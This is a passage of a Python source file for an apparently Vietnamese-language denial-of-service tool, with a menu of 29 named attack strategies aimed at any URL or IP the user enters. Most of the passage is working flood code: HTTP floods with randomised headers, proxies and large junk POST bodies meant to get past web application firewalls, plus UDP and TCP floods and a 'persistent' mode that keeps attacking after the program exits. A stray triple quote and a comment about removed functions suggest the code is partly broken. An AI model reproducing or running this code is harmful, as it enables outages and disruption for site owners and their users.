                            vulnerabilities.append({
                                "type": "Weak SSL/TLS Configuration",
                                "severity": "High",
                                "description": f"Phi√™n b·∫£n TLS l·ªói th·ªùi: {cipher[1]}.",
                                "recommendation": "S·ª≠ d·ª•ng TLS 1.2 tr·ªü l√™n, v√¥ hi·ªáu h√≥a giao th·ª©c c≈©."
                            })
                        if 'RSA' in cipher[0] and cert.get('subjectAltName', []):
                            vulnerabilities.append({
                                "type": "Weak SSL Cipher",
                                "severity": "Medium",
                                "description": f"Ph√°t hi·ªán cipher y·∫øu: {cipher[0]}.",
                                "recommendation": "S·ª≠ d·ª•ng cipher m·∫°nh (e.g., ECDHE)."
                            })
        except Exception as e:
            console.print(f"[warning][VULN SCAN] Qu√©t SSL/TLS th·∫•t b·∫°i: {str(e)}[/]")

    return vulnerabilities

# Display Vulnerability Report
def display_vulnerability_report(vulnerabilities):
    table = Table(title="üîç B√ÅO C√ÅO L·ªñ H·ªîNG B·∫¢O M·∫¨T", style="info")
    table.add_column("Lo·∫°i", style="highlight")
    table.add_column("M·ª©c ƒë·ªô", style="warning")
    table.add_column("M√¥ t·∫£")
    table.add_column("Khuy·∫øn ngh·ªã", style="success")
    for vuln in vulnerabilities:
        table.add_row(vuln["type"], vuln["severity"], vuln["description"], vuln["recommendation"])
    console.print(table)
    if not vulnerabilities:
        console.print("[success][VULN SCAN] Kh√¥ng ph√°t hi·ªán l·ªó h·ªïng n√†o! ‚úÖ[/]")
    else:
        console.print(f"[warning][VULN SCAN] Ph√°t hi·ªán {len(vulnerabilities)} l·ªó h·ªïng ti·ªÅm ·∫©n! ‚ö†[/]")
    Prompt.ask("[info]Nh·∫•n Enter ƒë·ªÉ tr·ªü v·ªÅ menu...[/]")

# Enhanced WAF bypass attack
def layer7_waf_bypass_attack(url):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    retry_attempts = 3
    while True:
        for attempt in range(retry_attempts):
            try:
                method = random.choice(methods)
                headers = generate_random_headers()
                proxy = get_random_proxy()
                payload = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(102400, 204800)))
                if HTTP2_AVAILABLE and urllib.parse.urlparse(url).scheme == 'https':
                    http2_multiplexing_attack(url)
                else:
                    headers['Connection'] = 'keep-alive'
                    headers['Keep-Alive'] = 'timeout=5, max=1000'
                    if method == "GET":
                        response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                    elif method == "POST":
                        response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
                    else:
                        response = session.head(url, headers=headers, proxies=proxy, timeout=2)
                    with manager:
                        global blocked_count
                        if response.status_code in (301, 401, 403, 429):
                            blocked_count[response.status_code] += 1
                            console.print(f"[warning][WAF BYPASS] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                            time.sleep(random.uniform(0.5, 2.0))
                            continue
                    console.print(f"[warning][WAF BYPASS] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status_code}[/]")
                    break
            except Exception as e:
                console.print(f"[error][WAF BYPASS] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
                time.sleep(random.uniform(0.5, 2.0))
            time.sleep(random.uniform(0.0001, 0.001))

# Multiprocessing attack
def multiprocessing_attack(url, requests_per_process):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    retry_attempts = 3
    while True:
        for attempt in range(retry_attempts):
            try:
                method = random.choice(methods)
                headers = generate_random_headers()
                proxy = get_random_proxy()
                payload = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(102400, 204800)))
                if method == "GET":
                    response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                elif method == "POST":
                    response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
                else:
                    response = session.head(url, headers=headers, proxies=proxy, timeout=2)
                with manager:
                    global blocked_count
                    if response.status_code in (301, 401, 403, 429):
                        blocked_count[response.status_code] += 1
                        console.print(f"[warning][ƒêA TI·∫æN TR√åNH] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                        time.sleep(random.uniform(0.5, 2.0))
                        continue
                console.print(f"[warning][ƒêA TI·∫æN TR√åNH] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status_code}[/]")
                break
            except Exception as e:
                console.print(f"[error][ƒêA TI·∫æN TR√åNH] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
                time.sleep(random.uniform(0.5, 2.0))
            time.sleep(0.001)

# Multiprocessing + Async attack
async def async_request(url, session):
    try:
        headers = generate_random_headers()
        proxy = get_random_proxy()
        async with session.get(url, headers=headers, proxy=proxy, timeout=2) as response:
            with manager:
                global blocked_count
                if response.status in (301, 401, 403, 429):
                    blocked_count[response.status] += 1
                    console.print(f"[warning][ƒêA TI·∫æN TR√åNH+ASYNC] M√£ tr·∫°ng th√°i {response.status} - Th·ª≠ bypass...[/]")
                    return
            console.print(f"[warning][ƒêA TI·∫æN TR√åNH+ASYNC] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status}[/]")
    except Exception as e:
        console.print(f"[error][ƒêA TI·∫æN TR√åNH+ASYNC] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")

async def multiprocessing_async_attack(url):
    async with aiohttp.ClientSession(headers=generate_random_headers()) as session:
        while True:
            tasks = [async_request(url, session) for _ in range(10)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.001)

def multiprocessing_async_wrapper(url, requests_per_process):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(multiprocessing_async_attack(url))

# Layer 4 UDP Flood
def udp_flood_attack(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            payload = os.urandom(random.randint(64, 1400))
            sock.sendto(payload, (host, port))
            console.print(f"[error][UDP FLOOD] G·ª≠i g√≥i tin ƒë·∫øn {host}:{port}[/]")
            time.sleep(0.0001)
    except Exception as e:
        console.print(f"[error][UDP FLOOD] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
    finally:
        sock.close()

# Layer 4 TCP/UDP Flood
def layer4_tcp_udp_flood(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        attack_types = ["SYN", "ACK", "RST"]
        while True:
            try:
                attack_type = random.choice(attack_types)
                if attack_type == "SYN":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    sock.send(b"\x00" * random.randint(64, 1400))
                elif attack_type == "ACK":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    sock.send(b"\x10" * random.randint(64, 1400))
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    sock.send(b"\x04" * random.randint(64, 1400))
                console.print(f"[error][TCP/UDP FLOOD] G·ª≠i {attack_type} ƒë·∫øn {host}:{port}[/]")
            except:
                pass
            time.sleep(0.0001)
    except Exception as e:
        console.print(f"[error][TCP/UDP FLOOD] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
    finally:
        sock.close()
"""

# Target configurations with last 6 functions removed
TARGET_CONFIGS = [
    {"id": "1", "name": "basic", "threads": 300, "requests": 300, "desc": "T·∫•n c√¥ng c∆° b·∫£n", "level": "Th·∫•p", "application": "Ki·ªÉm tra m·ª•c ti√™u"},
    {"id": "2", "name": "medium", "threads": 1500, "requests": 1500, "desc": "T·∫•n c√¥ng trung b√¨nh", "level": "Th·∫•p-Trung b√¨nh", "application": "M√°y ch·ªß nh·ªè"},
    {"id": "3", "name": "advanced", "threads": 3000, "requests": 3000, "desc": "T·∫•n c√¥ng n√¢ng cao", "level": "Trung b√¨nh", "application": "M√°y ch·ªß v·ª´a"},
    {"id": "4", "name": "ultra", "threads": 30000, "requests": 3000, "desc": "T·∫•n c√¥ng si√™u m·∫°nh", "level": "Trung b√¨nh-Cao", "application": "M·ª•c ti√™u b·∫£o v·ªá t·ªët"},
    {"id": "5", "name": "infinite", "threads": 6000, "requests": 3000, "desc": "T·∫•n c√¥ng v√≤ng l·∫∑p", "level": "Trung b√¨nh-Cao", "application": "T·∫•n c√¥ng li√™n t·ª•c"},
    {"id": "6", "name": "unlimited", "threads": 30000, "requests": 3000, "desc": "T·∫•n c√¥ng v√¥ h·∫°n", "level": "Trung b√¨nh-Cao", "application": "T·∫•n c√¥ng li√™n t·ª•c"},
    {"id": "7", "name": "overload", "threads": 45000, "requests": 6000, "desc": "T·∫•n c√¥ng qu√° t·∫£i 429/403", "level": "Cao", "application": "H·ªá th·ªëng gi·ªõi h·∫°n"},
    {"id": "8", "name": "blitz", "threads": 60000, "requests": 9000, "desc": "T·∫•n c√¥ng ch·ªõp nho√°ng 522", "level": "Cao", "application": "Gi√°n ƒëo·∫°n k·∫øt n·ªëi"},
    {"id": "9", "name": "layer3_4", "threads": 60000, "requests": 15000, "desc": "T·∫•n c√¥ng UDP t·∫ßng 3/4", "level": "Cao", "application": "Gi√°n ƒëo·∫°n m·∫°ng"},
    {"id": "10", "name": "combined", "threads": 75000, "requests": 12000, "desc": "T·∫•n c√¥ng ƒëa k·ªπ thu·∫≠t", "level": "Cao", "application": "M·ª•c ti√™u ph·ª©c t·∫°p"},
    {"id": "11", "name": "layer7", "threads": 75000, "requests": 12000, "desc": "T·∫•n c√¥ng t·∫ßng 7", "level": "Cao", "application": "Qu√° t·∫£i web"},
    {"id": "12", "name": "multi_vector", "threads": 90000, "requests": 18000, "desc": "T·∫•n c√¥ng ƒëa vector", "level": "R·∫•t Cao", "application": "M·ª•c ti√™u l·ªõn"},
    {"id": "13", "name": "god", "threads": 90000, "requests": 3000, "desc": "T·∫•n c√¥ng c·∫•p th·∫ßn", "level": "R·∫•t Cao", "application": "M·ª•c ti√™u b·∫£o m·∫≠t cao"},
    {"id": "14", "name": "hyper", "threads": 30000000, "requests": 3000, "desc": "T·∫•n c√¥ng si√™u t·ªëc", "level": "C·ª±c Cao", "application": "H·ªá th·ªëng l·ªõn"},
    {"id": "15", "name": "supra", "threads": 60000000, "requests": 3000, "desc": "T·∫•n c√¥ng t·ªëi cao", "level": "C·ª±c Cao", "application": "M·ª•c ti√™u si√™u l·ªõn"},
    {"id": "16", "name": "pulsar", "threads": 90000000, "requests": 3000, "desc": "T·∫•n c√¥ng pulsar", "level": "C·ª±c Cao", "application": "H·ªá th·ªëng ph√¢n t√°n"},
    {"id": "17", "name": "quasar", "threads": 105000000, "requests": 3000, "desc": "T·∫•n c√¥ng quasar", "level": "C·ª±c Cao", "application": "H·ªá th·ªëng CDN"},
    {"id": "18", "name": "prime", "threads": 150000000, "requests": 3000, "desc": "T·∫•n c√¥ng prime", "level": "C·ª±c Cao", "application": "H·ªá th·ªëng t·∫£i cao"},
    {"id": "19", "name": "cosmic", "threads": 180000000, "requests": 3000, "desc": "T·∫•n c√¥ng cosmic", "level": "C·ª±c Cao", "application": "H·ªá th·ªëng l·ªõn"},
    {"id": "20", "name": "ultima", "threads": 300000000, "requests": 3000, "desc": "T·∫•n c√¥ng t·ªëi th∆∞·ª£ng", "level": "C·ª±c Cao", "application": "H·ªá th·ªëng doanh nghi·ªáp"},
    {"id": "21", "name": "nova", "threads": 300000000, "requests": 3000, "desc": "T·∫•n c√¥ng supernova", "level": "C·ª±c Cao", "application": "H·ªá th·ªëng t·∫£i l·ªõn"},
    {"id": "22", "name": "titan", "threads": 15000000, "requests": 3000, "desc": "T·∫•n c√¥ng titan", "level": "C·ª±c ƒë·ªô", "application": "H·ªá th·ªëng si√™u l·ªõn"},
    {"id": "23", "name": "void", "threads": 702000000, "requests": 3000, "desc": "T·∫•n c√¥ng void", "level": "C·ª±c ƒë·ªô", "application": "M·ª•c ti√™u si√™u b·ªÅn"},
    {"id": "24", "name": "abyss", "threads": 2100000000, "requests": 3000, "desc": "T·∫•n c√¥ng abyss", "level": "C·ª±c ƒë·ªô", "application": "H·ªá th·ªëng qu·ªëc gia"},
    {"id": "25", "name": "omega", "threads": 3000000000, "requests": 3000, "desc": "T·∫•n c√¥ng omega", "level": "C·ª±c ƒë·ªô", "application": "H·ªá th·ªëng si√™u b·∫£o m·∫≠t"},
    {"id": "26", "name": "giga", "threads": 3000000000000, "requests": 3000, "desc": "T·∫•n c√¥ng giga", "level": "T·ªëi ƒëa", "application": "H·ªá th·ªëng to√†n c·∫ßu"},
    {"id": "27", "name": "persistent", "threads": 3000000000000, "requests": 30000, "desc": "T·∫•n c√¥ng li√™n t·ª•c", "level": "T·ªëi ƒëa", "application": "T·∫•n c√¥ng kh√¥ng ng·ª´ng"},
    {"id": "28", "name": "http2", "threads": 30000, "requests": 3000, "desc": "T·∫•n c√¥ng HTTP/2", "level": "Cao", "application": "M√°y ch·ªß HTTP/2"},
    {"id": "29", "name": "keep_alive", "threads": 30000, "requests": 3000, "desc": "T·∫•n c√¥ng keep-alive", "level": "Cao", "application": "M√°y ch·ªß HTTP"},
]

# Display ordered functions
def display_ordered_functions():
    clear_screen()
    display_banner()
    table = Table(title="üî• 29 CHI·∫æN L∆Ø·ª¢C T·∫§N C√îNG (S·∫ÆP X·∫æP THEO C∆Ø·ªúNG ƒê·ªò) üî•", style="info")
    table.add_column("ID", style="highlight")
    table.add_column("T√™n", style="success")
    table.add_column("M√¥ t·∫£")
    table.add_column("Lu·ªìng", justify="right")
    table.add_column("Y√™u c·∫ßu", justify="right")
    table.add_column("T·ªïng l∆∞·ª£t", justify="right")
    table.add_column("C·∫•p ƒë·ªô")
    table.add_column("·ª®ng d·ª•ng")
    sorted_configs = sorted(TARGET_CONFIGS, key=lambda x: x['threads'] * x['requests'])
    for func in sorted_configs:
        table.add_row(
            func['id'],
            func['name'].upper(),
            func['desc'],
            f"{func['threads']:,}",
            f"{func['requests']:,}",
            f"{func['threads'] * func['requests']:,}",
            func['level'],
            func['application']
        )
    console.print(table)
    Prompt.ask("[info]Nh·∫•n Enter ƒë·ªÉ tr·ªü v·ªÅ menu...[/]")

# Display target menu
def display_target_menu():
    clear_screen()
    display_banner()
    table = Table(title="üî• MENU CHI·∫æN L∆Ø·ª¢C T·∫§N C√îNG üî•", style="info")
    table.add_column("ID", style="highlight")
    table.add_column("T√™n", style="success")
    table.add_column("M√¥ t·∫£")
    table.add_row("0", "Danh s√°ch", "Xem danh s√°ch chi·∫øn l∆∞·ª£c")
    for target in sorted(TARGET_CONFIGS, key=lambda x: int(x['id'])):
        table.add_row(target['id'], target['name'].upper(), target['desc'])
    console.print(table)

# Main function
def main():
    check_file_integrity()
    multiprocessing.set_start_method('spawn')
    while True:
        try:
            display_target_menu()
            choice = Prompt.ask("[info]Nh·∫≠p l·ª±a ch·ªçn (0-29)[/]")

            if choice == "0":
                display_ordered_functions()
                continue

            target = next((t for t in TARGET_CONFIGS if t['id'] == choice), None)
            if not target:
                console.print("[error][L·ªñI] L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá! Th·ª≠ l·∫°i.[/]")
                time.sleep(1)
                continue
            target_selection_effect(target['name'])

            input_url = Prompt.ask("[info]Nh·∫≠p URL ho·∫∑c IP m·ª•c ti√™u[/]")
            if not input_url:
                console.print("[error][L·ªñI] URL/IP kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng! Th·ª≠ l·∫°i.[/]")
                time.sleep(1)
                continue

            try:
                validated_url = validate_url(input_url)
                host = urllib.parse.urlparse(validated_url).hostname
                port = urllib.parse.urlparse(validated_url).port or 80
            except ValueError:
                host = input_url
                port = 80
                validated_url = f"http://{host}"
                console.print(f"[warning][H·ªÜ TH·ªêNG] X·ª≠ l√Ω m·ª•c ti√™u nh∆∞ IP: {host}[/]")

            console.print(f"[success][H·ªÜ TH·ªêNG] M·ª•c ti√™u ƒë√£ kh√≥a: {validated_url}[/]")

            base_threads = target['threads']
            base_requests = target['requests']
            base_threads, base_requests = optimize_for_codespaces(base_threads, base_requests)

            if target['name'] == "persistent":
                console.print("[error][C·∫¢NH B√ÅO] T·∫•n c√¥ng s·∫Ω ch·∫°y n·ªÅn k·ªÉ c·∫£ sau khi tho√°t![/]")
                console.print("[warning]ƒê·ªÉ d·ª´ng: D√πng 'killall python3' (Linux/Termux) ho·∫∑c Task Manager (Windows)[/]")

            if target['name'] not in ("infinite", "unlimited", "overload", "blitz", "combined", "persistent", "layer3_4", "multi_vector", "layer7", "http2", "keep_alive"):
                confirm = Confirm.ask("[error][H·ªÜ TH·ªêNG] X√°c nh·∫≠n t·∫•n c√¥ng[/]")
                if not confirm:
                    console.print("[warning][H·ªÜ TH·ªêNG] H·ªßy t·∫•n c√¥ng[/]")
                    continue

            console.print("[info][H·ªÜ TH·ªêNG] ƒêang ƒë√°nh gi√° m·ª©c ƒë·ªô b·∫£o m·∫≠t c·ªßa m·ª•c ti√™u...[/]")
            loading_animation("ƒê√°nh gi√° b·∫£o m·∫≠t", 2)
            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url)

            if security_level == "TH·∫§P":
                NUM_THREADS = min(recommended_threads, base_threads // 2)
                REQUESTS_PER_THREAD = min(recommended_requests, base_requests // 2)
                attack_strategy = "T·∫§N C√îNG NH·∫∏"
            elif security_level == "TRUNG B√åNH":
                NUM_THREADS = base_threads
                REQUESTS_PER_THREAD = base_requests
                attack_strategy = "L·ª∞C L∆Ø·ª¢NG V·ª™A PH·∫¢I"
            else:
                NUM_THREADS = max(recommended_threads, base_threads)
                REQUESTS_PER_THREAD = max(recommended_requests, base_requests)
                attack_strategy = "L·ª∞C L∆Ø·ª¢NG T·ªêI ƒêA"

            panel = Panel(
                f"""
[+] CHI·∫æN L∆Ø·ª¢C T·∫§N C√îNG: {target['name'].upper()}
[+] M·ª•c ti√™u: {validated_url}
[+] Lu·ªìng: {NUM_THREADS:,}
[+] Y√™u c·∫ßu/Lu·ªìng: {REQUESTS_PER_THREAD:,}
[+] Chi·∫øn l∆∞·ª£c: {attack_strategy}
[+] T·ªïng l∆∞·ª£t ƒë√°nh: {NUM_THREADS * REQUESTS_PER_THREAD:,}
                """,
                title="üî• TH√îNG TIN T·∫§N C√îNG üî•",
                style="info"
            )
            console.print(panel)
            console.print("[error][H·ªÜ TH·ªêNG] Kh·ªüi ƒë·ªông t·∫•n c√¥ng...[/]")
            loading_animation("Kh·ªüi ƒë·ªông h·ªá th·ªëng t·∫•n c√¥ng", 3)

            start_time = time.time()

            if target['name'] == "persistent":
                save_attack_config(validated_url, NUM_THREADS, REQUESTS_PER_THREAD, target['name'])
                processes = []
                for _ in range(min(NUM_THREADS, multiprocessing.cpu_count() * 2)):
                    p = multiprocessing.Process(target=send_request, args=(validated_url, REQUESTS_PER_THREAD))
                    p.daemon = True
                    processes.append(p)
                    p.start()
                console.print(f"[error][H·ªÜ TH·ªêNG] T·∫•n c√¥ng li√™n t·ª•c b·∫Øt ƒë·∫ßu v·ªõi {len(processes)} ti·∫øn tr√¨nh! D√πng 'killall python3' ho·∫∑c Task Manager ƒë·ªÉ d·ª´ng.[/]")
                time.sleep(2)
                exit(0)
            elif target['name'] == "unlimited":
                unlimited_thread = threading.Thread(target=unlimited_threads_attack, args=(validated_url,))
                unlimited_thread.start()
                try:
                    unlimited_thread.join()
                except KeyboardInterrupt:
                    console.print("[warning][H·ªÜ TH·ªêNG] T·∫•n c√¥ng v√¥ h·∫°n b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng[/]")
                    exit(0)
            elif target['name'] == "overload":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=overload_429_403_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][H·ªÜ TH·ªêNG] T·∫•n c√¥ng qu√° t·∫£i 429/403 b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng[/]")
                    exit(0)
            elif target['name'] == "blitz":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=blitz_522_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][H·ªÜ TH·ªêNG] T·∫•n c√¥ng ch·ªõp nho√°ng 522 b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng[/]")
                    exit(0)
            elif target['name'] == "combined":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=combined_all_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][H·ªÜ TH·ªêNG] T·∫•n c√¥ng k·∫øt h·ª£p b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng[/]")
                    exit(0)
            elif target['name'] == "layer3_4":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=layer3_4_attack, args=(host, port, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][H·ªÜ TH·ªêNG] T·∫•n c√¥ng t·∫ßng 3/4 b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng[/]")
                    exit(0)
            elif target['name'] == "multi_vector":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=multi_vector_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][H·ªÜ TH·ªêNG] T·∫•n c√¥ng ƒëa vector b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng[/]")
                    exit(0)
            elif target['name'] == "layer7":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=send_request, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][H·ªÜ TH·ªêNG] T·∫•n c√¥ng t·∫ßng 7 b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng[/]")
                    exit(0)
            elif target['name'] == "http2":
                if not HTTP2_AVAILABLE:
                    console.print("[error][L·ªñI] T·∫•n c√¥ng HTTP/2 b·ªã v√¥ hi·ªáu h√≥a: Ch∆∞a c√†i ƒë·∫∑t module 'h2'[/]")
                    time.sleep(1)
                    continue
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=http2_multiplexing_attack, args=(validated_url,))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][H·ªÜ TH·ªêNG] T·∫•n c√¥ng HTTP/2 b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng[/]")
                    exit(0)
            elif target['name'] == "keep_alive":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=keep_alive_pipelining_attack, args=(validated_url,))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][H·ªÜ TH·ªêNG] T·∫•n c√¥ng keep-alive b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng[/]")
                    exit(0)
            else:
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=send_request, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][H·ªÜ TH·ªêNG] T·∫•n c√¥ng b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng[/]")
                    exit(0)

        except KeyboardInterrupt:
            console.print("[warning][H·ªÜ TH·ªêNG] ƒê√£ d·ª´ng b·ªüi ng∆∞·ªùi d√πng[/]")
            exit(0)
        except Exception as e:
            console.print(f"[error][L·ªñI] L·ªói h·ªá th·ªëng: {str(e)}[/]")
            time.sleep(1)

if __name__ == "__main__":
    main()